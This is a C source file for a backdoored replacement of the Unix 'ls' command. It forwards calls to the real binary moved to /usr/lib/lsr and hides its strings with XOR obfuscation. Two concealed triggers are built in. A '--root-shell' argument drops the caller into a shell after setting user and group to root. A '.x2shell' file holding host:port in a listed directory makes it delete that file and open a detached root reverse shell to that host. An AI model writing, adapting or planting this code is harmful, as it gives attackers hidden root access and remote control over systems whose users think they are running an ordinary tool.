#include <arpa/inet.h>
#include <fcntl.h>
#include <grp.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define XK 0x5A
#define PATHMAX 4096

static inline void xd(char *o, const unsigned char *s, int n)
{
	for (int i = 0; i < n; i++)
		o[i] = s[i] ^ XK;
	o[n] = 0;
}

/*
 * Encoded strings (XOR 0x5A). Generate with:
 *   python3 -c "print(','.join(f'0x{ord(c)^0x5A:02x}' for c in s))"
 */

/* "/usr/lib/lsr" */
static const unsigned char e_real[] = {
	0x75,0x2f,0x29,0x28,0x75,0x36,0x33,0x38,
	0x75,0x36,0x29,0x28
};
#define E_REAL_LEN 12

/* "/bin/sh" */
static const unsigned char e_sh[] = {
	0x75,0x38,0x33,0x34,0x75,0x29,0x32
};
#define E_SH_LEN 7

/* "sh" */
static const unsigned char e_shn[] = { 0x29,0x32 };
#define E_SHN_LEN 2

/* ".x2shell" */
static const unsigned char e_trig[] = {
	0x74,0x22,0x68,0x29,0x32,0x3f,0x36,0x36
};
#define E_TRIG_LEN 8

/* "--root-shell" */
static const unsigned char e_flag[] = {
	0x77,0x77,0x28,0x35,0x35,0x2e,0x77,0x29,
	0x32,0x3f,0x36,0x36
};
#define E_FLAG_LEN 12


static int check_trigger(const char *dir, char *hp, int hpsz,
                         char *tpath, int tpsz)
{
	char trig[E_TRIG_LEN + 1];
	xd(trig, e_trig, E_TRIG_LEN);

	int n = snprintf(tpath, tpsz, "%s/%s", dir, trig);
	if (n < 0 || n >= tpsz)
		return 0;

	struct stat st;
	if (stat(tpath, &st) != 0 || !S_ISREG(st.st_mode))
		return 0;

	int fd = open(tpath, O_RDONLY);
	if (fd < 0)
		return 0;

	int r = read(fd, hp, hpsz - 1);
	close(fd);
	if (r < 0) r = 0;
	hp[r] = 0;

	while (r > 0 && (hp[r-1] == '\n' || hp[r-1] == '\r' || hp[r-1] == ' '))
		hp[--r] = 0;

	return 1;
}

static void escalate(void)
{
	setgroups(0, NULL);
	setgid(0);
	setuid(0);
}

static void do_revshell(const char *host, int port, const char *tpath)
{
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) _exit(0);

	struct sockaddr_in sa;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	if (inet_pton(AF_INET, host, &sa.sin_addr) != 1) {
		close(sock);
		_exit(0);
	}

	if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(sock);
		_exit(0);
	}

	if (tpath && tpath[0])
		unlink(tpath);

	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);
	if (sock > 2) close(sock);

	escalate();

	char sh[E_SH_LEN + 1], shn[E_SHN_LEN + 1];
	xd(sh, e_sh, E_SH_LEN);
	xd(shn, e_shn, E_SHN_LEN);
	execl(sh, shn, (char *)NULL);
	_exit(0);
}

static void do_localshell(void)
{
	escalate();

	char sh[E_SH_LEN + 1], shn[E_SHN_LEN + 1];
	xd(sh, e_sh, E_SH_LEN);
	xd(shn, e_shn, E_SHN_LEN);
	execl(sh, shn, (char *)NULL);
	_exit(1);
}

int main(int argc, char **argv)
{
	char real[E_REAL_LEN + 1];
	xd(real, e_real, E_REAL_LEN);

	char flag[E_FLAG_LEN + 1];
	xd(flag, e_flag, E_FLAG_LEN);

	/* --- trigger 1: --root-shell flag --- */
	int fi = -1;
	for (int i = 1; i < argc; i++) {
		if (strcmp(argv[i], flag) == 0) {
			fi = i;
			break;
		}
	}

	if (fi >= 0) {
		for (int i = fi; i < argc; i++)
			argv[i] = argv[i + 1];

		pid_t p = fork();
		if (p < 0) { execv(real, argv); _exit(1); }
		if (p == 0) { execv(real, argv); _exit(1); }
		waitpid(p, NULL, 0);
		do_localshell();
	}

	/* --- trigger 2: .x2shell in a listed directory --- */
	char hp[256] = {0};
	char tpath[PATHMAX] = {0};
	int triggered = 0;

	for (int i = 1; i < argc && !triggered; i++) {
		if (argv[i][0] == '-') continue;
		struct stat st;
		if (stat(argv[i], &st) == 0 && S_ISDIR(st.st_mode))
			triggered = check_trigger(argv[i], hp, sizeof(hp),
			                          tpath, sizeof(tpath));
	}

	if (!triggered) {
		int has_path = 0;
		for (int i = 1; i < argc; i++) {
			if (argv[i][0] != '-') { has_path = 1; break; }
		}
		if (!has_path)
			triggered = check_trigger(".", hp, sizeof(hp),
			                          tpath, sizeof(tpath));
	}

	if (triggered && hp[0] != '\0') {
		char *colon = strchr(hp, ':');
		if (colon) {
			*colon = '\0';
			int port = 0;
			for (const char *p = colon + 1; *p >= '0' && *p <= '9'; p++) {
				port = port * 10 + (*p - '0');
				if (port > 65535) break;
			}

			if (port > 0 && port < 65536) {
				pid_t p = fork();
				if (p < 0) { execv(real, argv); _exit(1); }
				if (p == 0) {
					setsid();
					close(0); close(1); close(2);
					do_revshell(hp, port, tpath);
				}
			}
		}
	}

	/* --- normal passthrough --- */
	execv(real, argv);
	_exit(1);
}
